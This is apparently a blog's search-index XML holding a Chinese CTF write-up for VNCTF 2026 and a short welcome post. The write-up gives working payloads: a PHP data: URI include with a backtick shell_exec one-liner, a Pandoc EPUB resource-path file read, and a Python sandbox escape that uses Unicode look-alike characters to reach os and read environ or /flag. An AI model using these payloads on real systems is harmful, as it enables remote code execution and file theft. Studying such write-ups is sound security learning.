<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title></title>
    <link href="/myblog/2026/02/14/VNCTF-2026/"/>
    <url>/myblog/2026/02/14/VNCTF-2026/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​这是我学web半年来打的第一场有关战队的比赛，只能说又开了眼界，被很多新的解题技巧迷得眼花缭乱，虽然差了个java反序列化没做出来，但还是很开心，毕竟这是我第一次打进前40名并且还是第一次解出难度为困难的题目（附一张解题照片）</p><p>希望来年加油技术提升吧！！！！</p><p><img src="/myblog/img/VNCTF_2026/11.png" alt="图片描述"></p><h1 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a><strong>Signin</strong></h1><p>审视源码发现过滤了[‘&#x2F;‘, ‘convert’, ‘base’, ‘text’, ‘plain’]</p><p>由GET体file传参进行文件包含（当file长度小等于20时）</p><p>于是便可以用data协议进行文件上传包含，但是&#x2F;&#x2F;被ban，所以可以用短符号简写绕过：data;,<br> 然后，由于include具有解析上传文件的特性，能把上传的文件当作php代码识别，故可以写出以下payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?file=data:,<span class="hljs-meta">&lt;?php</span>info();<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/myblog/img/VNCTF_2026/1.png" alt="图片描述"></p><p>phpinfo显示short_open_tag&#x3D;On，所以可以用短标签减少字数</p><p>随后就可以构建一句话了</p><p>原本是&lt;?&#x3D;eval($_GET[x]);这样的，但是长度超20了</p><p>于是上网搜得反引号是 shell_exec() 的语法糖</p><p>即<code>$_GET[0]</code> &#x3D;&#x3D;&#x3D; shell_exec($_GET[0])</p><p>（题目不支持POST传参）</p><p>所以构得最后payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?file=data:,<span class="hljs-meta">&lt;?=</span>`<span class="hljs-variable">$_GET</span>[x]`;&amp;x=cat /flag<br></code></pre></td></tr></table></figure><p>得到flag</p><p><img src="/myblog/img/VNCTF_2026/2.png" alt="图片描述"></p><h1 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a><strong>渗透测试</strong></h1><p>题目是一个登录框，给了一个密码附件，很明显是要去爆破密码，一共两万个密码（）</p><p>Burp suite抓包发现上传的参数被加密了，所以直接用intruder爆破肯定不现实，所以便然ai写了个模拟键盘输入的键盘宏的python脚本一个个爆破密码，用户名admin</p><p>最后跑了一个晚上跑出来了（分多个虚拟机同时跑），密码是5V26s9dBZQVBZgyyVC00baeW</p><p><img src="/myblog/img/VNCTF_2026/3.png" alt="图片描述"></p><h1 id="Markdown2world"><a href="#Markdown2world" class="headerlink" title="Markdown2world"></a><strong>Markdown2world</strong></h1><p>首先试了一下上传别的后缀文件，提示只能上传.md或.markdown后缀的文件，于是只能在Pandoc机制，转换机制，和不同类型文件的特性中研究</p><p>题目提示了</p><p><img src="/myblog/img/VNCTF_2026/4.png" alt="图片描述"></p><p>于是只能上网搜一下这几种文件都有哪些可能的漏洞</p><p>发现可以试试tamplate模板注入，于是构造payload：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"> \<span class="hljs-params">---</span><br><br>template: <span class="hljs-string">/flag</span><br><br>\<span class="hljs-params">---</span><br><br> <br><br>xxxxxxxxx（一定要写）<br></code></pre></td></tr></table></figure><p>上传，发现被拦截了</p><p>template和reference-doc被过滤，pdf文件有上传不了，只能试试通过资源文件引用+EPUB打包机制 进行任意文件读取，或者通过文件名注入命令了</p><p>首先是看了上传后文件名会被重新修改，于是随便上传了一个名为<?phpinfo();?>.md的文件。但是没用</p><p>那就只能试试Pandoc的特性:<br> Pandoc生成EPUB时，有一个特性叫 “Resource Fetching”（资源抓取），只要通过构造特殊的资源抓取语句来改变EPUB抓取的资源的路径即可达到类似于“文件包含”的效果，将flag打包下载下来</p><p>Payload（可以多设几条路径提高拿到flag的概率）：</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs lua"> \<span class="hljs-comment">---</span><br><br>resource-<span class="hljs-built_in">path</span>: [<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-string">&quot;/tmp&quot;</span>, <span class="hljs-string">&quot;/home/ctf&quot;</span>, <span class="hljs-string">&quot;.&quot;</span>]<br><br>\<span class="hljs-comment">---</span><br><br> <br><br>![flag](/flag)<br></code></pre></td></tr></table></figure><p> 下载下来后可以改后缀为.zip来解压</p><p>在解压包中拿到flag：</p><p><img src="/myblog/img/VNCTF_2026/5.png" alt="图片描述"></p><p><img src="/myblog/img/VNCTF_2026/6.png" alt="图片描述"></p><h1 id="I-really-really-really"><a href="#I-really-really-really" class="headerlink" title="I really really really"></a><strong>I really really really</strong></h1><p>看到题目发现考的是python沙箱逃逸（慌了），只能现学现卖了()</p><p>先进行简单的fuzz测试，发现常规的’ “ [ ] { } __ ;和数字0-9都被过滤了，hint提及unicode，于是就去搜寻这些字符有关的unicode编码其他格式（查了超多资料，这里只写了有用的编码）<br> 发现单引号: ʼ [U+02BC]修饰符右单引号<br> 没被过滤</p><p>发现_没被过滤</p><p>就想着引入模块去做，结果发现几乎全部的模块都被删了（应该是所有的）</p><p>首先先要解决__的问题，这里用了fuzz测试了多种组合：_̲ ﹍﹎ ﹏﹍ ⁔﹍ ﹋﹌等等等一大把</p><p>最后发现只有_̲ 和 ﹎_没被过滤，本来以为_̲ 可以，结果不知道为啥系统自动识别成了普通字符</p><p><img src="/myblog/img/VNCTF_2026/7.png" alt="图片描述"></p><p><img src="/myblog/img/VNCTF_2026/8.png" alt="图片描述"></p><p>随后就是关键字的问题，本来想着用ʼ claʼ +ʼss ʼ的方法绕过的，但是失败了，但是后来看到题目的字体后才发觉可以试试数学花体字母𝓬𝓵𝓪𝓼𝓼，于是就成功了</p><p>等基本的完工后就运用一点ssti的知识读取flag</p><p>但是不知道为啥始终返回空白</p><p>等后面群里师傅说在环境变量里也有flag才找到另一条生路</p><p>首先鉴于单行字符不能超过30，所以采用拼接的方式串联起payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">a=()<br><br>b=a._﹍𝓬𝓵𝓪𝓼𝓼﹍_<br><br>c=b._﹍𝓫𝓪𝓼𝓮﹍_<br><br>d=c._﹍𝓼𝓾𝓫𝓬𝓵𝓪𝓼𝓼𝓮𝓼﹍_()<br><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> d:<br><br> <span class="hljs-keyword">try</span>:<br><br> g=x._﹍𝓲𝓷𝓲𝓽﹍_._﹍𝓰𝓵𝓸𝓫𝓪𝓵𝓼﹍_<br><br><span class="hljs-keyword">except</span>:<span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><p>随后就是通过报错</p><p>（触发AssertionError: &lt;r的内容&gt;，**错误信息一定会显示在网页回显中）**读取environ字典了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python">a=()<br><br>b=a._﹍𝓬𝓵𝓪𝓼𝓼﹍_<br><br>c=b._﹍𝓫𝓪𝓼𝓮﹍_<br><br>d=c._﹍𝓼𝓾𝓫𝓬𝓵𝓪𝓼𝓼𝓮𝓼﹍_()<br><br>r=()<br><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> d:<br><br> <span class="hljs-keyword">try</span>:<br><br> g=x._﹍𝓲𝓷𝓲𝓽﹍_._﹍𝓰𝓵𝓸𝓫𝓪𝓵𝓼﹍_<br><br> e=g.get(k).environ<br><br> r=e<br><br> <span class="hljs-keyword">except</span>:<span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">assert</span> ...!=...,r<br></code></pre></td></tr></table></figure><p>但是这个回显是</p><p><img src="/myblog/img/VNCTF_2026/9.png" alt="图片描述"></p><p>跟ai探讨了一个小时左右，发现原来不是模块被删了，而是放到别的模块去了（应该是的），所以只能利用一个try&#x2F;expect循环遍历__init__.__globals__找到包含os模块的globals</p><p>最后生成的payload如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python">a=()<br><br>b=a._﹍𝓬𝓵𝓪𝓼𝓼﹍_<br><br>c=b._﹍𝓫𝓪𝓼𝓮﹍_<br><br>d=c._﹍𝓼𝓾𝓫𝓬𝓵𝓪𝓼𝓼𝓮𝓼﹍_()<br><br>r=()<br><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> d:<br><br> <span class="hljs-keyword">try</span>:<br><br> g=x._﹍𝓲𝓷𝓲𝓽﹍_._﹍𝓰𝓵𝓸𝓫𝓪𝓵𝓼﹍_<br><br> <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> g:<br><br>  <span class="hljs-keyword">try</span>:<br><br>  e=g.get(k).environ<br><br>  r=e<br><br>  <span class="hljs-keyword">except</span>:<span class="hljs-keyword">pass</span><br><br> <span class="hljs-keyword">except</span>:<span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">assert</span> ...!=...,r<br></code></pre></td></tr></table></figure><p>在环境变量中找到flag：<br> <img src="/myblog/img/VNCTF_2026/10.png" alt="图片描述"></p><p>其实我本来是想把flag导入到同目录的文件中的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python">a=()<br><br>b=a._﹍𝓬𝓵𝓪𝓼𝓼﹍_<br><br>c=b._﹍𝓫𝓪𝓼𝓮﹍_<br><br>d=c._﹍𝓼𝓾𝓫𝓬𝓵𝓪𝓼𝓼𝓮𝓼﹍_()<br><br>r=()<br><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> d:<br><br> <span class="hljs-keyword">try</span>:<br><br> g=x._﹍𝓲𝓷𝓲𝓽﹍_._﹍𝓰𝓵𝓸𝓫𝓪𝓵𝓼﹍_<br><br> h=g.get(ʼosʼ)<br><br> h.system(ʼcat /flag&gt;/tmp/aʼ)<br><br> <span class="hljs-keyword">except</span>:<br><br> <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">assert</span> ...!=...,r<br></code></pre></td></tr></table></figure><p>但是代码太长了，导致不能实现</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello Guys!</title>
    <link href="/myblog/2025/11/09/Hello%20Guys!/"/>
    <url>/myblog/2025/11/09/Hello%20Guys!/</url>
    
    <content type="html"><![CDATA[<h1 id="欢迎来到Zomon的个人网安学习日志"><a href="#欢迎来到Zomon的个人网安学习日志" class="headerlink" title="欢迎来到Zomon的个人网安学习日志~"></a>欢迎来到Zomon的个人网安学习日志~</h1><h2 id="这将记录我从零开始的网安学习之旅"><a href="#这将记录我从零开始的网安学习之旅" class="headerlink" title="这将记录我从零开始的网安学习之旅"></a>这将记录我从零开始的网安学习之旅</h2><h3 id="Let’s-suck-it-and-see"><a href="#Let’s-suck-it-and-see" class="headerlink" title="Let’s suck it and see!"></a>Let’s suck it and see!</h3>]]></content>
    
    
    <categories>
      
      <category>个人网安日记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>日记</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
